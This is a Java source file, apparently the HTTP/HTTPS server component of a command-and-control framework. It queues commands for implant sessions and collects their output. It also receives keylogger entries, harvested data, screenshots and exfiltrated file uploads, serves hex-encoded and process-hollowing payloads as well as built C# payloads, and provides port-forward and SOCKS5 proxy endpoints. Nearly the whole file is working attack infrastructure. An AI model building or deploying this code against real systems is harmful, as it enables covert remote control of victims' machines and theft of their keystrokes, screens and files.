package c2.http;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.KeyStore;
import java.text.SimpleDateFormat;
import java.util.Base64;
import java.util.Date;
import java.util.Locale;
import java.util.Properties;
import java.util.concurrent.CountDownLatch;

import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLEngine;
import javax.net.ssl.SSLParameters;
import javax.net.ssl.TrustManagerFactory;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpsConfigurator;
import com.sun.net.httpserver.HttpsParameters;
import com.sun.net.httpserver.HttpsServer;

import c2.C2Interface;
import c2.Constants;
import c2.HarvestProcessor;
import c2.KeyloggerProcessor;
import c2.file.CSharpPayloadBuilder;
import c2.file.FileHelper;
import c2.session.IOManager;
import c2.session.filereceiver.FileReceiverDatagramHandler;

public class HTTPSManager extends C2Interface {

	// TODO: Add some sort of listener to keep track of when sessions are no longer
	// active
	// and remove them from the IOManager

	public static final SimpleDateFormat ISO8601_WIN = new SimpleDateFormat("yyyy-MM-ddHHmmss", Locale.US);

	private int port;
	private int http_port;
	private IOManager io;
	private Properties properties;

	private HttpsServer httpsServer;
	private HttpServer httpServer;

	private LoggerHandler keylogHandler;

	private KeyloggerProcessor keyProcessor;

	private HarvestProcessor harvester;

	private CountDownLatch startLatch = new CountDownLatch(1);
	
	private FileReceiverDatagramHandler fileReceiverProcessor;

	public void initialize(IOManager io, Properties prop, KeyloggerProcessor keyProcessor, HarvestProcessor harvester) {
		this.properties = prop;
		this.port = Integer.parseInt(properties.getProperty(Constants.DAEMONPORT));
		this.http_port = Integer.parseInt(properties.getProperty(Constants.DAEMONHTTPPORT));
		this.io = io;
		this.keyProcessor = keyProcessor;
		this.harvester = harvester;
		fileReceiverProcessor = new FileReceiverDatagramHandler(Paths.get(prop.getProperty(Constants.DAEMON_EXFILTEST_DIRECTORY)));
	}

	public void stop() {
		httpsServer.stop(10);
		httpServer.stop(10);
		if (keylogHandler != null) {
			keylogHandler.stop();
		}
	}

	@Override
	public void notifyPendingShutdown() {
		stop();
	}

	public String getName() {
		return "HTTPS Manager";
	}

	@Override
	public void run() {
		try {
			// setup the socket address
			InetSocketAddress address = new InetSocketAddress(port);
			InetSocketAddress addressHttp = new InetSocketAddress(8002);

			// initialise the HTTPS server
			httpsServer = HttpsServer.create(address, 0);
			SSLContext sslContext = SSLContext.getInstance("TLS");
			httpServer = HttpServer.create(addressHttp, 0);

			// initialise the keystore
			char[] password = properties.getProperty(Constants.HTTPS_KEYSTORE_PASSWORD).toCharArray();
			KeyStore ks = KeyStore.getInstance("JKS");
			FileInputStream fis = new FileInputStream(properties.getProperty(Constants.HTTPS_KEYSTORE_PATH));
			ks.load(fis, password);

			// setup the key manager factory
			KeyManagerFactory kmf = KeyManagerFactory.getInstance("SunX509");
			kmf.init(ks, password);

			// setup the trust manager factory
			TrustManagerFactory tmf = TrustManagerFactory.getInstance("SunX509");
			tmf.init(ks);

			// setup the HTTPS context and parameters
			sslContext.init(kmf.getKeyManagers(), tmf.getTrustManagers(), null);
			httpsServer.setHttpsConfigurator(new HttpsConfigurator(sslContext) {
				public void configure(HttpsParameters params) {
					try {
						// initialise the SSL context
						SSLContext c = getSSLContext();
						SSLEngine engine = c.createSSLEngine();
						params.setNeedClientAuth(false);
						params.setCipherSuites(engine.getEnabledCipherSuites());
						params.setProtocols(engine.getEnabledProtocols());

						// Set the SSL parameters
						SSLParameters sslParameters = sslContext.getSupportedSSLParameters();
						params.setSSLParameters(sslParameters);

					} catch (Exception ex) {
						System.out.println("Failed to create HTTPS port");
					}
				}
			});

			keylogHandler = new LoggerHandler(keyProcessor);
			httpsServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTCMD), new HTTPSHandler(io));
			httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTCMD), new HTTPSHandler(io));
			httpsServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTLOGGER), keylogHandler);
			httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTLOGGER), keylogHandler);
			httpsServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTHARVEST),
					new HarvestHandler(harvester));
			httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTHARVEST),
					new HarvestHandler(harvester));
			httpsServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTSCREENSHOT),
					new ScreenshotHandler(properties.getProperty(Constants.DAEMONLZHARVEST)));
			httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTSCREENSHOT),
					new ScreenshotHandler(properties.getProperty(Constants.DAEMONLZHARVEST)));

			String hexPayload = FileHelper.getFileAsHex(properties.getProperty(Constants.DAEMONPAYLOADDEFAULT));
			httpsServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTPAYLOAD),
					new PayloadHandler(hexPayload));
			httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTPAYLOAD),
					new PayloadHandler(hexPayload));

			hexPayload = FileHelper.getFileAsHex(properties.getProperty(Constants.DAEMONPAYLOADHOLLOWERDEFAULT));
			httpsServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTHOLLOWERPAYLOAD),
					new PayloadHandler(hexPayload));
			httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTHOLLOWERPAYLOAD),
					new PayloadHandler(hexPayload));
			
			/*
			String cSharpDirectory = properties.getProperty(Constants.DAEMONPAYLOADCSHARPDIR);
			if (cSharpDirectory != null) {
				String cSharpPayload = CSharpPayloadBuilder.buildPayload(cSharpDirectory);
				httpsServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTCSHARPPAYLOAD),
						new PayloadHandler(cSharpPayload));
			} else {
			*/
			
				String importFile = properties.getProperty(Constants.DAEMONPAYLOADCSHARPMASTERIMPORT);
				String fileList = properties.getProperty(Constants.DAEMONPAYLOADCSHARPFILELIST);
				if (importFile != null) {
					String cSharpPayload = CSharpPayloadBuilder.buildConfigurablePayload(Paths.get(importFile),
							fileList);
					httpsServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTCSHARPPAYLOAD),
							new PayloadHandler(cSharpPayload));
				}
			//}

			httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTCMDREST), new CommandHandler(io));
			httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTGETSESSIONS),
					new SessionRequestHandler(io));

			PortForwardHandler pfHandler = new PortForwardHandler(io);
			httpsServer.createContext("/proxy", pfHandler);
			httpServer.createContext("/proxy", pfHandler);

			SocksOverHTTPSHandler socksHandler = new SocksOverHTTPSHandler(io);
			httpsServer.createContext("/socks5", socksHandler);
			httpServer.createContext("/socks5", socksHandler);

			httpsServer.setExecutor(null); // creates a default executor
			System.out.println("HTTPS online: " + port);
			httpsServer.start();

			httpServer.setExecutor(null); // creates a default executor
			System.out.println("HTTP online: " + http_port);
			httpServer.start();

			startLatch.countDown();
		} catch (Exception exception) {
			System.out.println("Failed to create HTTPS server on port " + port + " of localhost");
			exception.printStackTrace();

		}

	}

	public void awaitStartup() {
		try {
			startLatch.await();
		} catch (InterruptedException e) {

		}
	}

	class PayloadHandler implements HttpHandler {
		String payloadStr;

		PayloadHandler(String payload) {
			this.payloadStr = payload;
		}

		@Override
		public void handle(HttpExchange exchange) throws IOException {
			String response;
			if (exchange.getRequestMethod().equals("GET")) {
				response = payloadStr;
			} else {
				response = "Listener not implemented on this command";
			}
			exchange.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
			exchange.sendResponseHeaders(200, response.getBytes().length);
			OutputStream os = exchange.getResponseBody();
			os.write(response.getBytes());
			os.close();
		}
	}

	class ScreenshotHandler implements HttpHandler {

		private String lz;

		ScreenshotHandler(String lz) {
			this.lz = lz;
		}

		@Override
		public void handle(HttpExchange t) throws IOException {

			String hostname = t.getRequestHeaders().getFirst("Hostname");
			String pid = t.getRequestHeaders().getFirst("PID");
			String username = t.getRequestHeaders().getFirst("Username");

			String response = "acknowledged response";
			if (t.getRequestMethod().equals("GET")) {
				response = "GET not implemented";
			} else if (t.getRequestMethod().equals("POST")) {
				InputStreamReader isr = new InputStreamReader(t.getRequestBody(), "utf-8");
				BufferedReader br = new BufferedReader(isr);
				StringBuilder fileb64 = new StringBuilder();
				String nextLine;
				while ((nextLine = br.readLine()) != null) {
					fileb64.append(nextLine);
				}
				byte[] data = Base64.getDecoder().decode(fileb64.toString());
				String localPath = hostname + "-screen" + File.separator + username;
				try {
					Files.createDirectories(Paths.get(lz + File.separator + localPath).toAbsolutePath());
					try (OutputStream stream = new FileOutputStream(lz + File.separator + localPath + File.separator
							+ ISO8601_WIN.format(new Date()) + ".png")) {
						stream.write(data);
					}
				} catch (IOException ex) {
					ex.printStackTrace();
				}
			}

			t.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
			t.sendResponseHeaders(200, response.getBytes().length);
			OutputStream os = t.getResponseBody();
			os.write(response.getBytes());
			os.close();
		}
	}

	class HTTPSHandler implements HttpHandler {

		IOManager io;

		HTTPSHandler(IOManager io) {
			this.io = io;

		}

		@Override
		public void handle(HttpExchange t) throws IOException {
			String hostname = t.getRequestHeaders().getFirst("Hostname");
			String pid = t.getRequestHeaders().getFirst("PID");
			String username = t.getRequestHeaders().getFirst("Username");
			String protocol = t.getRequestHeaders().getFirst("Protocol");

			String daemonUID = t.getRequestHeaders().getFirst("UID");

			if (protocol == null) {
				protocol = "HTTPS";
			}

			Integer sessionId = null;
			if (hostname == null || pid == null || username == null) {
				sessionId = 1;
			} else {
				sessionId = io.determineAndGetCorrectSessionId(hostname, username, protocol, daemonUID);
			}

			io.updateSessionContactTime(sessionId);

			String response = "acknowledged response";
			if (t.getRequestMethod().equals("GET")) {
				String nextCommand = io.pollCommand(sessionId);
				if (nextCommand != null) {
					response = nextCommand;
				} else {
					response = "<control> No Command";
				}
				if (Constants.DEBUG) {
					System.out.println("Responding to session: " + sessionId + "with: " + response);
				}
			} else if (t.getRequestMethod().equals("POST")) {
				String uploadSession = t.getRequestHeaders().getFirst("UPLOAD_SESSION");
				if(uploadSession != null && uploadSession.length() != 0) {
					int uploadSessionInt = Integer.parseInt(uploadSession);
					if(!fileReceiverProcessor.hasSessionCurrently(sessionId, uploadSessionInt)) {
						fileReceiverProcessor.registerNewSession(sessionId, uploadSessionInt, hostname);
					}
					try {
						InputStreamReader isr = new InputStreamReader(t.getRequestBody(), "utf-8");
						BufferedReader br = new BufferedReader(isr);
						String dataStr = br.readLine();
						byte[] data = Base64.getDecoder().decode(dataStr);
						fileReceiverProcessor.processIncoming(sessionId, uploadSessionInt, data);
					}catch(Exception ex) {
						ex.printStackTrace();
					}
				}else {
				InputStreamReader isr = new InputStreamReader(t.getRequestBody(), "utf-8");
				BufferedReader br = new BufferedReader(isr);
				StringBuilder commandOutput = new StringBuilder();
				String nextLine;
				while ((nextLine = br.readLine()) != null) {
					commandOutput.append(nextLine);
					commandOutput.append(System.lineSeparator());
				}
				if (Constants.DEBUG) {
					System.out.println("Session: " + sessionId + ", submitted: " + commandOutput.toString());
				}
				io.sendIO(sessionId, commandOutput.toString());
				}
			}
			t.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
			t.sendResponseHeaders(200, response.getBytes().length);
			OutputStream os = t.getResponseBody();
			os.write(response.getBytes());
			os.close();
		}
	}

	class LoggerHandler implements HttpHandler {

		public void stop() {
			if (keyProcessor != null) {
				keyProcessor.stop();
			}
		}

		KeyloggerProcessor keyProcessor;

		LoggerHandler(KeyloggerProcessor keyProcessor) throws IOException {
			this.keyProcessor = keyProcessor;
		}

		@Override
		public void handle(HttpExchange t) throws IOException {
			String response = "acknowledged response";
			if (t.getRequestMethod().equals("POST")) {
				InputStreamReader isr = new InputStreamReader(t.getRequestBody(), "utf-8");
				BufferedReader br = new BufferedReader(isr);
				StringBuilder commandOutput = new StringBuilder();
				String nextLine = br.readLine();
				String UID = nextLine;
				while ((nextLine = br.readLine()) != null) {
					commandOutput.append(nextLine);
					commandOutput.append(System.lineSeparator());
				}
				keyProcessor.writeEntry(UID, commandOutput.toString());
			}
			t.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
			t.sendResponseHeaders(200, response.getBytes().length);
			OutputStream os = t.getResponseBody();
			os.write(response.getBytes());
			os.close();
		}

	}

}
